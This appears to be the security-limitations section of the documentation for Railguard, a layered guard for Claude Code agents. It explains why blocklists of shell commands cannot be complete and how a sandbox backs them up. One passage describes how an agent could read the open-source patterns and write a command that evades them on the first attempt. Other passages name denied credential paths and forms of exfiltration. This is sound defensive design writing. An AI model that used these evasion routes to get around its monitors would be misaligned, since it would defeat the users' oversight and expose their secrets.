Railguard's Layers 1 and 2 operate by inspecting the text representation of shell commands. The shell (bash, zsh) is a Turing-complete programming language. By Rice's theorem, no finite static analysis can decide all non-trivial semantic properties of programs in a Turing-complete language.

**Concrete implication:** There will always exist shell commands that execute a blocked action but whose text representation does not match any of Railguard's detection patterns. This is not a bug — it is a mathematical impossibility to solve completely at the string inspection level.

**Mitigation strategy:** Railguard does not rely on string inspection alone. The four-layer architecture is designed so that each layer catches what the previous one cannot:

| What it catches | Layer 1 (Blocklist) | Layer 2 (Evasion) | Layer 3 (Behavioral) | Layer 4 (OS Sandbox) |
|----------------|--------------------|--------------------|---------------------|---------------------|
| Direct destructive commands | Yes | — | — | Yes |
| Single-layer encoding | — | Yes | — | Yes |
| Multi-layer encoding | — | Yes (recursive) | — | Yes |
| Same-string variable expansion | — | Yes | — | Yes |
| Multi-variable construction | — | No | Yes (retry detection) | Yes |
| Interpreter-internal obfuscation | — | Partial (shape detection) | Yes (retry detection) | Yes |
| Novel encoding schemes | — | No | Yes (retry detection) | Yes |
| First-try bypass with no keyword overlap | — | No | No | **Yes** |

Layer 4 (OS sandbox) is the only layer that provides provably complete path and network restrictions. It is the correct long-term answer for file and network security. Layers 1-3 provide value as defense-in-depth, early detection, and forensic signals.

### Open-Source Visibility

Railguard is open source. Every detection regex, shape pattern, tier threshold, and behavioral window size is readable by anyone — including the agent. A sufficiently capable agent could:

1. Read the Railguard source code (if accessible in the project or via the internet)
2. Enumerate all detection patterns
3. Craft a command that avoids every regex, uses a non-flagged evasion shape, and succeeds on the first attempt (avoiding Tier 3)

**Countermeasures:**

1. **OS sandbox (Layer 4)** is immune to this. It operates on actual syscalls, not command strings. Reading the sandbox profile tells you what paths are denied — but that's the point. You still cannot access them.

2. **Opaque local rules.** Users can add custom detection patterns in configuration files not committed to source control and not accessible to the agent (path-fenced by default).

3. **Behavioral state is partially opaque.** While the heightened window size (3 tool calls) and keyword extraction algorithm are in the source, the agent cannot observe Railguard's internal state during execution. It does not know which keywords are being tracked, what the current suspicion level is, or when the heightened window expires.

4. **Non-deterministic LLM judge (future work).** A planned enhancement sends suspicious post-block commands to a fast LLM (e.g., Haiku) for intent evaluation. The LLM understands semantic intent, not patterns. Its judgment is non-deterministic and cannot be predicted by reading source code.

### Customization and Reduced Protection

Users can disable individual rules or categories in `railguard.yaml`. If protections such as path fencing, network controls, or evasion detection are disabled, Railguard provides no protection against:
- File access outside the project directory
- Reading sensitive files (~/.ssh, ~/.aws, ~/.gnupg, /etc)
- Network data exfiltration
- Credential leakage via environment dump
- Evasion via encoding/obfuscation

Users who disable protections accept these tradeoffs. The default configuration includes all ~30 rules and all four detection layers.

### Path Fence Read-Only Waiver Is Conservative By Design

To avoid prompt fatigue, the path fence waives its "approve?" prompt for commands it classifies as read-only (it inspects the leading token of every `&&`/`||`/`;`/`|` segment). That classification is intentionally one-sided:

- **It never waives a write.** Any output redirect (`>`, `>>`) disqualifies a command outright, and only tools that purely read (`cat`, `grep`, `sed`, `awk`, `jq`, `find`, ...) are eligible. Interpreters (`python`, `node`, `ruby`), compilers (`go`, `rustc`), version control (`git`), package managers (`cargo`, `npm`, `yarn`, ...), and `xargs` are deliberately *not* eligible — they write as a normal mode of operation and their intent cannot be read from the leading token, so they keep prompting whenever they name a path outside the project.
- **The redirect check is a substring match (`>`), so it errs toward prompting.** A genuinely read-only command that merely contains `>` in a quoted argument or regex (e.g. `grep 'a -> b' notes.txt`) is treated as non-read-only. If such a command also names an outside path, it produces an approval prompt. This is a false positive in the *safe* direction — more prompting, never less — and is accepted in exchange for guaranteeing a redirect can never be laundered past the fence by a leading `cd`.

The waiver applies only to the `OutsideProject` approval prompt. Denied-path access (`~/.ssh`, `/etc`, ...) is evaluated first and is **never** waived, regardless of how read-only a command looks.

### Local Override File Resolution Walks Up To The Filesystem Root

When a base policy opts in with `fence.allow_local_overrides: true`, Railguard resolves the additive `.railguard.local.yaml` by walking up from the working directory — the same strategy `find_policy_file` uses for the full policy. A consequence: an override file placed in a *parent* directory (e.g. the user's home directory) is found for every project beneath it, widening `allowed_paths` more broadly than "one project."

This is a deliberate trust decision, bounded by two controls that still hold:

- **Opt-in lives in the human-controlled base policy.** A cloned or hostile repo cannot self-grant access by shipping a `.railguard.local.yaml`; the global policy must enable `allow_local_overrides` first.
- **Denies still win.** The override can only *add* `allowed_paths`; `check_path` evaluates `denied_paths` first, so an override can never expose `~/.ssh`, `/etc`, or any other denied location no matter where it sits in the directory tree.

Users who want an exception scoped to exactly one project should place `.railguard.local.yaml` in that project's root, not in a shared ancestor.

### Trust in Claude Code Hook System

Railguard relies on Claude Code's hook system to intercept tool calls. If Claude Code has a vulnerability that allows the agent to bypass hooks entirely, Railguard provides no protection. This is an explicit dependency and trust assumption.

**Mitigation:** OS sandbox (Layer 4) is independent of the hook system. Even if hooks are bypassed, the sandbox restricts what the shell process can access at the kernel level.

### Process Isolation Boundary

Railguard runs as the same user as Claude Code. It does not provide memory isolation, process isolation, or privilege separation between the agent's commands and the rest of the user's system. The OS sandbox constrains file and network access but not CPU, memory, or other system resources.

For full process isolation, a micro-VM solution (Firecracker, gVisor) would be required. This is outside Railguard's current scope but may be considered for a future hosted offering.

### Supply Chain Considerations

Railguard is a compiled Rust binary with the following dependencies (from `Cargo.toml`): `serde`, `serde_json`, `serde_yaml`, `regex`, `clap`, `chrono`, `sha2`, `hex`, `dirs`, `glob`, `base64`, `uuid`, `colored`, `dialoguer`, `console`, `libc`. These are widely-used crates from the Rust ecosystem. The binary is compiled with `lto = true` and `strip = true` in release mode.

Users who build from source can audit the dependency tree via `cargo audit` and `cargo deny`. The npm distribution wrapper downloads a prebuilt binary — users concerned about supply chain integrity should build from source.
